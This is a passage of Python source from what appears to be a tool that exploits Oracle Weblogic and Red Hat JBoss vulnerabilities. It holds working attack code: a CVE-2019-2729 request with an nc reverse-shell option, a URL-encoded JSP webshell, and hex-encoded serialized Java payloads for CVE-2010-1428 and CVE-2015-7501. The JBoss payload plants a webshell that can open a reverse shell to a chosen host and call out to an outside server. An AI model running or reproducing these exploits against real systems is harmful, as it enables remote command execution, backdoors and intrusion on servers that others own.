            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
            
    def cve_2019_2729(self):
        self.pocname = "Oracle Weblogic: CVE-2019-2729"
        self.info = color.derce() + " [nc shell]"
        self.path = "/wls-wsat/CoordinatorPortType"
        self.rawdata = "null"
        self.r = "PoCWating"
        self.method = "post"
        self.headers = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
            'content-type': 'text/xml',
            'cmd': CMD
        }
        try:
            self.request = requests.post(self.url+self.path, data=self.payload_cve_2019_2729, headers=self.headers,
                                         timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            if CMD == "nc":
                self.ncip = input(now.timed(de=DELAY) + color.green("[+] Nc host(ip): "))
                self.ncport = input(now.timed(de=DELAY) + color.green("[+] Nc port: "))
                self.nc = self.weblogic_nc.replace("REIP", self.ncip).replace("REPORT", self.ncport)
                self.request = requests.post(self.url + "/wls-wsat/CoordinatorPortType", data=self.nc,
                                             headers=self.headers, timeout=TIMEOUT, verify=False)
                if self.request.status_code == 500:
                    self.r = "NC-Succes"
                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                else:
                    self.r = "NC-Failed"
                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2020_2551(self):
        self.pocname = "Oracle Weblogic: CVE-2020-2551"
        self.info = color.derce()
        self.path = "/wls-wsat/CoordinatorPortType"
        self.rawdata = ">_< Vuln CVE-2020-2551 send using iiop protocol. So no http request and response"
        self.r = "PoCWating"
        self.method = "iiop"
        self.payload = bytes.fromhex('47494f50010200030000001700000002000000000000000b4e616d6553657276696365')
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((self.hostname, self.port))
            sock.send(self.payload)
            self.res = sock.recv(20)
            if b'GIOP' in self.res:
                self.r = "PoCSuCCeSS"
            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except socket.timeout as error:
            verify.timeout_output(self.pocname)
        except Exception as error:
            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)

class RedHatJBoss():
    def __init__(self, url):
        self.url = url
        self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if r"https" in self.url:
            self.conn = http.client.HTTPSConnection(self.hostname, self.port)
        else:
            self.conn = http.client.HTTPConnection(self.hostname, self.port)
        self.headers = {
            "Content-Type" : "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
            "Accept" : "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
        }

        self.jsp_webshell = ("%3c%25%40%20%70%61%67%65%20%6c%61%6e%67%75%61%67%65%3d%22%6a%61%76%61%22%20%69%6d%70"
            "%6f%72%74%3d%22%6a%61%76%61%2e%75%74%69%6c%2e%2a%2c%6a%61%76%61%2e%69%6f%2e%2a%22%20%70%61%67%65%45%6e"
            "%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%25%3e%3c%25%21%70%75%62%6c%69%63%20%73%74%61%74%69%63%20%53"
            "%74%72%69%6e%67%20%65%78%63%75%74%65%43%6d%64%28%53%74%72%69%6e%67%20%63%29%20%7b%53%74%72%69%6e%67%42"
            "%75%69%6c%64%65%72%20%6c%69%6e%65%20%3d%20%6e%65%77%20%53%74%72%69%6e%67%42%75%69%6c%64%65%72%28%29%3b"
            "%74%72%79%20%7b%50%72%6f%63%65%73%73%20%70%72%6f%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74"
            "%69%6d%65%28%29%2e%65%78%65%63%28%63%29%3b%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%62%75%66%20%3d"
            "%20%6e%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%49%6e%70%75%74%53%74%72%65%61"
            "%6d%52%65%61%64%65%72%28%70%72%6f%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%53%74%72"
            "%69%6e%67%20%74%65%6d%70%20%3d%20%6e%75%6c%6c%3b%77%68%69%6c%65%20%28%28%74%65%6d%70%20%3d%20%62%75%66"
            "%2e%72%65%61%64%4c%69%6e%65%28%29%29%20%21%3d%20%6e%75%6c%6c%29%20%7b%6c%69%6e%65%2e%61%70%70%65%6e%64"
            "%28%74%65%6d%70%2b%22%5c%5c%6e%22%29%3b%7d%62%75%66%2e%63%6c%6f%73%65%28%29%3b%7d%20%63%61%74%63%68%20"
            "%28%45%78%63%65%70%74%69%6f%6e%20%65%29%20%7b%6c%69%6e%65%2e%61%70%70%65%6e%64%28%65%2e%67%65%74%4d%65"
            "%73%73%61%67%65%28%29%29%3b%7d%72%65%74%75%72%6e%20%6c%69%6e%65%2e%74%6f%53%74%72%69%6e%67%28%29%3b%7d"
            "%25%3e%3c%25%69%66%28%22%70%61%73%73%77%6f%72%64%22%2e%65%71%75%61%6c%73%28%72%65%71%75%65%73%74%2e%67"
            "%65%74%50%61%72%61%6d%65%74%65%72%28%22%70%77%64%22%29%29%26%26%21%22%22%2e%65%71%75%61%6c%73%28%72%65"
            "%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%29%29%7b%6f%75%74%2e%70%72"
            "%69%6e%74%6c%6e%28%22%3c%70%72%65%3e%22%2b%65%78%63%75%74%65%43%6d%64%28%72%65%71%75%65%73%74%2e%67%65"
            "%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%29%2b%22%3c%2f%70%72%65%3e%22%29%3b%7d%65%6c%73%65"
            "%7b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%3a%2d%29%22%29%3b%7d%25%3e")
        self.payload_cve_2010_1428 = (
            "\xAC\xED\x00\x05\x73\x72\x00\x2E\x6F\x72\x67\x2E\x6A\x62\x6F\x73\x73\x2E\x63\x6F\x6E\x73\x6F"
            "\x6C\x65\x2E\x72\x65\x6D\x6F\x74\x65\x2E\x52\x65\x6D\x6F\x74\x65\x4D\x42\x65\x61\x6E\x49\x6E\x76"
            "\x6F\x63\x61\x74\x69\x6F\x6E\xE0\x4F\xA3\x7A\x74\xAE\x8D\xFA\x02\x00\x04\x4C\x00\x0A\x61\x63\x74"
            "\x69\x6F\x6E\x4E\x61\x6D\x65\x74\x00\x12\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72"
            "\x69\x6E\x67\x3B\x5B\x00\x06\x70\x61\x72\x61\x6D\x73\x74\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2F\x6C"
            "\x61\x6E\x67\x2F\x4F\x62\x6A\x65\x63\x74\x3B\x5B\x00\x09\x73\x69\x67\x6E\x61\x74\x75\x72\x65\x74"
            "\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72\x69\x6E\x67\x3B\x4C\x00\x10"
            "\x74\x61\x72\x67\x65\x74\x4F\x62\x6A\x65\x63\x74\x4E\x61\x6D\x65\x74\x00\x1D\x4C\x6A\x61\x76\x61"
            "\x78\x2F\x6D\x61\x6E\x61\x67\x65\x6D\x65\x6E\x74\x2F\x4F\x62\x6A\x65\x63\x74\x4E\x61\x6D\x65\x3B"
            "\x78\x70\x74\x00\x06\x64\x65\x70\x6C\x6F\x79\x75\x72\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2E\x6C\x61"
            "\x6E\x67\x2E\x4F\x62\x6A\x65\x63\x74\x3B\x90\xCE\x58\x9F\x10\x73\x29\x6C\x02\x00\x00\x78\x70\x00"
            "\x00\x00\x01\x73\x72\x00\x0C\x6A\x61\x76\x61\x2E\x6E\x65\x74\x2E\x55\x52\x4C\x96\x25\x37\x36\x1A"
            "\xFC\xE4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6F\x64\x65\x49\x00\x04\x70\x6F\x72\x74"
            "\x4C\x00\x09\x61\x75\x74\x68\x6F\x72\x69\x74\x79\x71\x00\x7E\x00\x01\x4C\x00\x04\x66\x69\x6C\x65"
            "\x71\x00\x7E\x00\x01\x4C\x00\x04\x68\x6F\x73\x74\x71\x00\x7E\x00\x01\x4C\x00\x08\x70\x72\x6F\x74"
            "\x6F\x63\x6F\x6C\x71\x00\x7E\x00\x01\x4C\x00\x03\x72\x65\x66\x71\x00\x7E\x00\x01\x78\x70\xFF\xFF"
            "\xFF\xFF\xFF\xFF\xFF\xFF\x74\x00\x0E\x6A\x6F\x61\x6F\x6D\x61\x74\x6F\x73\x66\x2E\x63\x6F\x6D\x74"
            "\x00\x0F\x2F\x72\x6E\x70\x2F\x6A\x65\x78\x77\x73\x34\x2E\x77\x61\x72\x71\x00\x7E\x00\x0B\x74\x00"
            "\x04\x68\x74\x74\x70\x70\x78\x75\x72\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x53"
            "\x74\x72\x69\x6E\x67\x3B\xAD\xD2\x56\xE7\xE9\x1D\x7B\x47\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74"
            "\x00\x0C\x6A\x61\x76\x61\x2E\x6E\x65\x74\x2E\x55\x52\x4C\x73\x72\x00\x1B\x6A\x61\x76\x61\x78\x2E"
            "\x6D\x61\x6E\x61\x67\x65\x6D\x65\x6E\x74\x2E\x4F\x62\x6A\x65\x63\x74\x4E\x61\x6D\x65\x0F\x03\xA7"
            "\x1B\xEB\x6D\x15\xCF\x03\x00\x00\x78\x70\x74\x00\x21\x6A\x62\x6F\x73\x73\x2E\x73\x79\x73\x74\x65"
            "\x6D\x3A\x73\x65\x72\x76\x69\x63\x65\x3D\x4D\x61\x69\x6E\x44\x65\x70\x6C\x6F\x79\x65\x72\x78")

        self.payload_cve_2015_7501 = (
            "\xAC\xED\x00\x05\x73\x72\x00\x29\x6F\x72\x67\x2E\x6A\x62\x6F\x73\x73\x2E\x69\x6E\x76\x6F\x63"
            "\x61\x74\x69\x6F\x6E\x2E\x4D\x61\x72\x73\x68\x61\x6C\x6C\x65\x64\x49\x6E\x76\x6F\x63\x61\x74\x69"
            "\x6F\x6E\xF6\x06\x95\x27\x41\x3E\xA4\xBE\x0C\x00\x00\x78\x70\x70\x77\x08\x78\x94\x98\x47\xC1\xD0"
            "\x53\x87\x73\x72\x00\x11\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x49\x6E\x74\x65\x67\x65\x72\x12"
            "\xE2\xA0\xA4\xF7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6C\x75\x65\x78\x72\x00\x10\x6A\x61"
            "\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x4E\x75\x6D\x62\x65\x72\x86\xAC\x95\x1D\x0B\x94\xE0\x8B\x02\x00"
            "\x00\x78\x70\xE3\x2C\x60\xE6\x73\x72\x00\x24\x6F\x72\x67\x2E\x6A\x62\x6F\x73\x73\x2E\x69\x6E\x76"
            "\x6F\x63\x61\x74\x69\x6F\x6E\x2E\x4D\x61\x72\x73\x68\x61\x6C\x6C\x65\x64\x56\x61\x6C\x75\x65\xEA"
            "\xCC\xE0\xD1\xF4\x4A\xD0\x99\x0C\x00\x00\x78\x70\x7A\x00\x00\x04\x00\x00\x00\x09\xD3\xAC\xED\x00"
            "\x05\x75\x72\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x4F\x62\x6A\x65\x63\x74\x3B"
            "\x90\xCE\x58\x9F\x10\x73\x29\x6C\x02\x00\x00\x78\x70\x00\x00\x00\x04\x73\x72\x00\x1B\x6A\x61\x76"
            "\x61\x78\x2E\x6D\x61\x6E\x61\x67\x65\x6D\x65\x6E\x74\x2E\x4F\x62\x6A\x65\x63\x74\x4E\x61\x6D\x65"
            "\x0F\x03\xA7\x1B\xEB\x6D\x15\xCF\x03\x00\x00\x78\x70\x74\x00\x2C\x6A\x62\x6F\x73\x73\x2E\x61\x64"
            "\x6D\x69\x6E\x3A\x73\x65\x72\x76\x69\x63\x65\x3D\x44\x65\x70\x6C\x6F\x79\x6D\x65\x6E\x74\x46\x69"
            "\x6C\x65\x52\x65\x70\x6F\x73\x69\x74\x6F\x72\x79\x78\x74\x00\x05\x73\x74\x6F\x72\x65\x75\x71\x00"
            "\x7E\x00\x00\x00\x00\x00\x05\x74\x00\x0B\x6A\x65\x78\x69\x6E\x76\x34\x2E\x77\x61\x72\x74\x00\x07"
            "\x6A\x65\x78\x69\x6E\x76\x34\x74\x00\x04\x2E\x6A\x73\x70\x74\x08\x98\x3C\x25\x40\x20\x70\x61\x67"
            "\x65\x20\x69\x6D\x70\x6F\x72\x74\x3D\x22\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x2A\x2C\x6A\x61"
            "\x76\x61\x2E\x75\x74\x69\x6C\x2E\x2A\x2C\x6A\x61\x76\x61\x2E\x69\x6F\x2E\x2A\x2C\x6A\x61\x76\x61"
            "\x2E\x6E\x65\x74\x2E\x2A\x22\x20\x70\x61\x67\x65\x45\x6E\x63\x6F\x64\x69\x6E\x67\x3D\x22\x55\x54"
            "\x46\x2D\x38\x22\x25\x3E\x20\x3C\x70\x72\x65\x3E\x20\x3C\x25\x20\x63\x6C\x61\x73\x73\x20\x72\x76"
            "\x20\x65\x78\x74\x65\x6E\x64\x73\x20\x54\x68\x72\x65\x61\x64\x7B\x49\x6E\x70\x75\x74\x53\x74\x72"
            "\x65\x61\x6D\x20\x69\x73\x3B\x4F\x75\x74\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x20\x6F\x73\x3B\x72"
            "\x76\x28\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x20\x69\x73\x2C\x4F\x75\x74\x70\x75\x74\x53"
            "\x74\x72\x65\x61\x6D\x20\x6F\x73\x29\x7B\x74\x68\x69\x73\x2E\x69\x73\x3D\x69\x73\x3B\x74\x68\x69"
            "\x73\x2E\x6F\x73\x3D\x6F\x73\x3B\x7D\x70\x75\x62\x6C\x69\x63\x20\x76\x6F\x69\x64\x20\x72\x75\x6E"
            "\x28\x29\x7B\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61\x64\x65\x72\x20\x69\x6E\x3D\x6E\x75\x6C"
            "\x6C\x3B\x42\x75\x66\x66\x65\x72\x65\x64\x57\x72\x69\x74\x65\x72\x20\x6F\x75\x74\x3D\x6E\x75\x6C"
            "\x6C\x3B\x74\x72\x79\x7B\x69\x6E\x3D\x6E\x65\x77\x20\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61"
            "\x64\x65\x72\x28\x6E\x65\x77\x20\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x52\x65\x61\x64\x65"
            "\x72\x28\x74\x68\x69\x73\x2E\x69\x73\x29\x29\x3B\x6F\x75\x74\x3D\x6E\x65\x77\x20\x42\x75\x66\x66"
            "\x65\x72\x65\x64\x57\x72\x69\x74\x65\x72\x28\x6E\x65\x77\x20\x4F\x75\x74\x70\x75\x74\x53\x74\x72"
            "\x65\x61\x6D\x57\x72\x69\x74\x65\x72\x28\x74\x68\x69\x73\x2E\x6F\x73\x29\x29\x3B\x63\x68\x61\x72"
            "\x20\x62\x5B\x5D\x3D\x6E\x65\x77\x20\x63\x68\x61\x72\x5B\x38\x31\x39\x32\x5D\x3B\x69\x6E\x74\x20"
            "\x6C\x3B\x77\x68\x69\x6C\x65\x28\x28\x6C\x3D\x69\x6E\x2E\x72\x65\x61\x64\x28\x62\x2C\x30\x2C\x62"
            "\x2E\x6C\x65\x6E\x67\x74\x68\x29\x29\x3E\x30\x29\x7B\x6F\x75\x74\x2E\x77\x72\x69\x74\x65\x28\x62"
            "\x2C\x30\x2C\x6C\x29\x3B\x6F\x75\x74\x2E\x66\x6C\x75\x73\x68\x28\x29\x3B\x7D\x7D\x63\x61\x74\x63"
            "\x68\x28\x45\x78\x63\x65\x70\x74\x69\x6F\x6E\x20\x65\x29\x7B\x7D\x7D\x7D\x53\x74\x72\x69\x6E\x67"
            "\x20\x73\x68\x3D\x6E\x75\x6C\x6C\x3B\x69\x66\x28\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x65\x74\x50"
            "\x61\x72\x61\x6D\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x21\x3D\x6E\x75\x6C\x6C\x29\x7B\x73"
            "\x68\x3D\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x65\x74\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x28\x22"
            "\x70\x70\x70\x22\x29\x3B\x7D\x65\x6C\x73\x65\x20\x69\x66\x28\x72\x65\x71\x75\x65\x73\x74\x2E\x67"
            "\x65\x74\x48\x65\x61\x64\x65\x72\x28\x22\x58\x2D\x4A\x45\x58\x22\x29\x21\x3D\x20\x6E\x75\x6C\x6C"
            "\x29\x7B\x73\x68\x3D\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x65\x74\x48\x65\x61\x64\x65\x72\x28\x22"
            "\x58\x2D\x4A\x45\x58\x22\x29\x3B\x7D\x69\x66\x28\x73\x68\x20\x21\x3D\x20\x6E\x75\x6C\x6C\x29\x7B"
            "\x72\x65\x73\x70\x6F\x6E\x73\x65\x2E\x73\x65\x74\x43\x6F\x6E\x74\x65\x6E\x74\x54\x79\x70\x65\x28"
            "\x22\x74\x65\x78\x74\x2F\x68\x74\x6D\x6C\x22\x29\x3B\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61"
            "\x64\x65\x72\x20\x62\x72\x3D\x6E\x75\x6C\x6C\x3B\x53\x74\x72\x69\x6E\x67\x20\x6C\x68\x63\x3D\x28"
            "\x6E\x65\x77\x20\x44\x61\x74\x65\x28\x29\x2E\x74\x6F\x53\x74\x72\x69\x6E\x67\x28\x29\x2E\x73\x70"
            "\x6C\x69\x74\x28\x22\x3A\x22\x29\x5B\x30\x5D\x2B\x22\x68\x2E\x6C\x6F\x67\x22\x29\x2E\x72\x65\x70"
            "\x6C\x61\x63\x65\x41\x6C\x6C\x28\x22\x20\x22\x2C\x22\x2D\x22\x29\x3B\x74\x72\x79\x7B\x69\x66\x28"
            "\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x7A\x00\x00\x04\x00\x65\x74\x48\x65\x61\x64\x65\x72\x28\x22"
            "\x6E\x6F\x2D\x63\x68\x65\x63\x6B\x2D\x75\x70\x64\x61\x74\x65\x73\x22\x29\x3D\x3D\x6E\x75\x6C\x6C"
            "\x29\x7B\x48\x74\x74\x70\x55\x52\x4C\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x63\x3D\x28\x48"
            "\x74\x74\x70\x55\x52\x4C\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x29\x6E\x65\x77\x20\x55\x52\x4C"
            "\x28\x22\x68\x74\x74\x70\x3A\x2F\x2F\x77\x65\x62\x73\x68\x65\x6C\x6C\x2E\x6A\x65\x78\x62\x6F\x73"
            "\x73\x2E\x6E\x65\x74\x2F\x6A\x73\x70\x5F\x76\x65\x72\x73\x69\x6F\x6E\x2E\x74\x78\x74\x22\x29\x2E"
            "\x6F\x70\x65\x6E\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x28\x29\x3B\x63\x2E\x73\x65\x74\x52\x65"
            "\x71\x75\x65\x73\x74\x50\x72\x6F\x70\x65\x72\x74\x79\x28\x22\x55\x73\x65\x72\x2D\x41\x67\x65\x6E"
            "\x74\x22\x2C\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x65\x74\x48\x65\x61\x64\x65\x72\x28\x22\x48\x6F"
            "\x73\x74\x22\x29\x2B\x22\x3C\x2D\x22\x2B\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x65\x74\x52\x65\x6D"
            "\x6F\x74\x65\x41\x64\x64\x72\x28\x29\x29\x3B\x69\x66\x28\x21\x6E\x65\x77\x20\x46\x69\x6C\x65\x28"
            "\x22\x63\x68\x65\x63\x6B\x5F\x22\x2B\x6C\x68\x63\x29\x2E\x65\x78\x69\x73\x74\x73\x28\x29\x29\x7B"
            "\x50\x72\x69\x6E\x74\x57\x72\x69\x74\x65\x72\x20\x77\x3D\x6E\x65\x77\x20\x50\x72\x69\x6E\x74\x57"
            "\x72\x69\x74\x65\x72\x28\x22\x63\x68\x65\x63\x6B\x5F\x22\x2B\x6C\x68\x63\x29\x3B\x77\x2E\x63\x6C"
            "\x6F\x73\x65\x28\x29\x3B\x62\x72\x3D\x6E\x65\x77\x20\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61"
            "\x64\x65\x72\x28\x6E\x65\x77\x20\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x52\x65\x61\x64\x65"
            "\x72\x28\x63\x2E\x67\x65\x74\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x28\x29\x29\x29\x3B\x53"
            "\x74\x72\x69\x6E\x67\x20\x6C\x76\x3D\x62\x72\x2E\x72\x65\x61\x64\x4C\x69\x6E\x65\x28\x29\x2E\x73"
            "\x70\x6C\x69\x74\x28\x22\x20\x22\x29\x5B\x31\x5D\x3B\x69\x66\x28\x21\x6C\x76\x2E\x65\x71\x75\x61"
            "\x6C\x73\x28\x22\x34\x22\x29\x29\x7B\x6F\x75\x74\x2E\x70\x72\x69\x6E\x74\x28\x22\x4E\x65\x77\x20"
            "\x76\x65\x72\x73\x69\x6F\x6E\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x75\x70\x64\x61\x74\x65\x21\x22"
            "\x29\x3B\x7D\x7D\x65\x6C\x73\x65\x20\x69\x66\x28\x73\x68\x2E\x69\x6E\x64\x65\x78\x4F\x66\x28\x22"
            "\x69\x64\x22\x29\x21\x3D\x2D\x31\x7C\x7C\x73\x68\x2E\x69\x6E\x64\x65\x78\x4F\x66\x28\x22\x69\x70"
            "\x63\x6F\x6E\x66\x69\x67\x22\x29\x21\x3D\x2D\x31\x29\x7B\x63\x2E\x67\x65\x74\x49\x6E\x70\x75\x74"
            "\x53\x74\x72\x65\x61\x6D\x28\x29\x3B\x7D\x7D\x7D\x63\x61\x74\x63\x68\x28\x45\x78\x63\x65\x70\x74"
            "\x69\x6F\x6E\x20\x65\x29\x7B\x6F\x75\x74\x2E\x70\x72\x69\x6E\x74\x6C\x6E\x28\x22\x46\x61\x69\x6C"
            "\x65\x64\x20\x74\x6F\x20\x63\x68\x65\x63\x6B\x20\x66\x6F\x72\x20\x75\x70\x64\x61\x74\x65\x73\x22"
            "\x29\x3B\x7D\x74\x72\x79\x7B\x50\x72\x6F\x63\x65\x73\x73\x20\x70\x3B\x62\x6F\x6F\x6C\x65\x61\x6E"
            "\x20\x6E\x69\x78\x3D\x74\x72\x75\x65\x3B\x69\x66\x28\x21\x53\x79\x73\x74\x65\x6D\x2E\x67\x65\x74"
            "\x50\x72\x6F\x70\x65\x72\x74\x79\x28\x22\x66\x69\x6C\x65\x2E\x73\x65\x70\x61\x72\x61\x74\x6F\x72"
            "\x22\x29\x2E\x65\x71\x75\x61\x6C\x73\x28\x22\x2F\x22\x29\x29\x7B\x6E\x69\x78\x3D\x66\x61\x6C\x73"
            "\x65\x3B\x7D\x69\x66\x28\x73\x68\x2E\x69\x6E\x64\x65\x78\x4F\x66\x28\x22\x6A\x65\x78\x72\x65\x6D"
            "\x6F\x74\x65\x3D\x22\x29\x21\x3D\x2D\x31\x29\x7B\x53\x6F\x63\x6B\x65\x74\x20\x73\x63\x3D\x6E\x65"
            "\x77\x20\x53\x6F\x63\x6B\x65\x74\x28\x73\x68\x2E\x73\x70\x6C\x69\x74\x28\x22\x3D\x22\x29\x5B\x31"
            "\x5D\x2E\x73\x70\x6C\x69\x74\x28\x22\x3A\x22\x29\x5B\x30\x5D\x2C\x49\x6E\x74\x65\x67\x65\x72\x2E"
            "\x70\x61\x72\x73\x65\x49\x6E\x74\x28\x73\x68\x2E\x73\x70\x6C\x69\x74\x28\x22\x3A\x22\x29\x5B\x31"
            "\x5D\x29\x29\x3B\x69\x66\x28\x6E\x69\x78\x29\x7B\x73\x68\x3D\x22\x2F\x62\x69\x6E\x2F\x62\x61\x73"
            "\x68\x22\x3B\x7D\x65\x6C\x73\x65\x7B\x73\x68\x3D\x22\x63\x6D\x64\x2E\x65\x78\x65\x22\x3B\x7D\x70"
            "\x3D\x52\x75\x6E\x74\x69\x6D\x65\x2E\x67\x65\x74\x52\x75\x6E\x74\x69\x6D\x65\x28\x29\x2E\x65\x78"
            "\x65\x63\x28\x73\x68\x29\x3B\x28\x6E\x65\x77\x20\x72\x76\x28\x70\x2E\x67\x65\x74\x49\x6E\x70\x75"
            "\x74\x53\x74\x72\x65\x61\x6D\x28\x29\x2C\x73\x63\x2E\x67\x65\x74\x4F\x75\x74\x70\x75\x74\x53\x74"
            "\x72\x65\x61\x6D\x28\x29\x29\x29\x2E\x73\x74\x61\x72\x74\x28\x29\x3B\x28\x6E\x65\x77\x20\x72\x76"
            "\x28\x73\x63\x2E\x67\x65\x74\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x28\x29\x2C\x70\x2E\x67"
            "\x65\x74\x4F\x75\x74\x70\x7A\x00\x00\x01\xDB\x75\x74\x53\x74\x72\x65\x61\x6D\x28\x29\x29\x29\x2E"
            "\x73\x74\x61\x72\x74\x28\x29\x3B\x7D\x65\x6C\x73\x65\x7B\x69\x66\x28\x6E\x69\x78\x29\x7B\x70\x3D"
            "\x52\x75\x6E\x74\x69\x6D\x65\x2E\x67\x65\x74\x52\x75\x6E\x74\x69\x6D\x65\x28\x29\x2E\x65\x78\x65"
            "\x63\x28\x6E\x65\x77\x20\x53\x74\x72\x69\x6E\x67\x5B\x5D\x7B\x22\x2F\x62\x69\x6E\x2F\x62\x61\x73"
            "\x68\x22\x2C\x22\x2D\x63\x22\x2C\x73\x68\x7D\x29\x3B\x7D\x65\x6C\x73\x65\x7B\x70\x3D\x52\x75\x6E"
            "\x74\x69\x6D\x65\x2E\x67\x65\x74\x52\x75\x6E\x74\x69\x6D\x65\x28\x29\x2E\x65\x78\x65\x63\x28\x22"
            "\x63\x6D\x64\x2E\x65\x78\x65\x20\x2F\x43\x20\x22\x2B\x73\x68\x29\x3B\x7D\x62\x72\x3D\x6E\x65\x77"
            "\x20\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61\x64\x65\x72\x28\x6E\x65\x77\x20\x49\x6E\x70\x75"
            "\x74\x53\x74\x72\x65\x61\x6D\x52\x65\x61\x64\x65\x72\x28\x70\x2E\x67\x65\x74\x49\x6E\x70\x75\x74"
            "\x53\x74\x72\x65\x61\x6D\x28\x29\x29\x29\x3B\x53\x74\x72\x69\x6E\x67\x20\x64\x3D\x62\x72\x2E\x72"
            "\x65\x61\x64\x4C\x69\x6E\x65\x28\x29\x3B\x77\x68\x69\x6C\x65\x28\x64\x20\x21\x3D\x20\x6E\x75\x6C"
            "\x6C\x29\x7B\x6F\x75\x74\x2E\x70\x72\x69\x6E\x74\x6C\x6E\x28\x64\x29\x3B\x64\x3D\x62\x72\x2E\x72"
            "\x65\x61\x64\x4C\x69\x6E\x65\x28\x29\x3B\x7D\x7D\x7D\x63\x61\x74\x63\x68\x28\x45\x78\x63\x65\x70"
            "\x74\x69\x6F\x6E\x20\x65\x29\x7B\x6F\x75\x74\x2E\x70\x72\x69\x6E\x74\x6C\x6E\x28\x22\x55\x6E\x6B"
            "\x6E\x6F\x77\x6E\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x22\x29\x3B\x7D\x7D\x25\x3E\x73\x72\x00\x11\x6A"
            "\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x42\x6F\x6F\x6C\x65\x61\x6E\xCD\x20\x72\x80\xD5\x9C\xFA\xEE"
            "\x02\x00\x01\x5A\x00\x05\x76\x61\x6C\x75\x65\x78\x70\x01\x75\x72\x00\x13\x5B\x4C\x6A\x61\x76\x61"
            "\x2E\x6C\x61\x6E\x67\x2E\x53\x74\x72\x69\x6E\x67\x3B\xAD\xD2\x56\xE7\xE9\x1D\x7B\x47\x02\x00\x00"
            "\x78\x70\x00\x00\x00\x05\x74\x00\x10\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x53\x74\x72\x69\x6E"
            "\x67\x71\x00\x7E\x00\x0F\x71\x00\x7E\x00\x0F\x71\x00\x7E\x00\x0F\x74\x00\x07\x62\x6F\x6F\x6C\x65"
            "\x61\x6E\xF9\x12\x63\x17\x78\x77\x08\x00\x00\x00\x00\x00\x00\x00\x01\x73\x72\x00\x22\x6F\x72\x67"
            "\x2E\x6A\x62\x6F\x73\x73\x2E\x69\x6E\x76\x6F\x63\x61\x74\x69\x6F\x6E\x2E\x49\x6E\x76\x6F\x63\x61"
            "\x74\x69\x6F\x6E\x4B\x65\x79\xB8\xFB\x72\x84\xD7\x93\x85\xF9\x02\x00\x01\x49\x00\x07\x6F\x72\x64"
            "\x69\x6E\x61\x6C\x78\x70\x00\x00\x00\x04\x70\x78")
            
    # 2020-09-23    
    def cve_2010_0738(self):
